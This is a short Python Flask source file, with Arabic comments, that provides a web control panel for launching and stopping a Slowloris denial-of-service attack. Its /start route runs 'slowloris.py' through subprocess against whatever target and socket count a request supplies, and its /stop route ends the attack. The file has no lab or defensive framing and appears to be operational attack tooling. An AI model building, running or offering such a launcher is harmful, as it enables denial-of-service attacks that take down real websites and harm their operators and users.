from flask import Flask, render_template, request, jsonify
import subprocess
import os

app = Flask(__name__)

# لتخزين العملية الحالية
current_process = None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_attack():
    global current_process
    target = request.json.get('target')
    sockets = request.json.get('sockets', 150)

    if current_process:
        return jsonify({"status": "error", "message": "Attack is already running!"})

    # بناء الأمر بشكل صحيح بناءً على طريقة استدعاء slowloris.py
    command = ["python3", "slowloris.py", target, "-s", str(sockets)]
    
    # بدء الهجوم
    current_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    # إذا تم بدء الهجوم بنجاح
    return jsonify({"status": "success", "message": f"Attack started on {target} with {sockets} sockets!"})

@app.route('/stop', methods=['POST'])
def stop_attack():
    global current_process
    if current_process:
        current_process.terminate()
        current_process = None
        return jsonify({"status": "success", "message": "Attack stopped!"})
    else:
        return jsonify({"status": "error", "message": "No attack is running!"})

if __name__ == '__main__':
    app.run(debug=True)
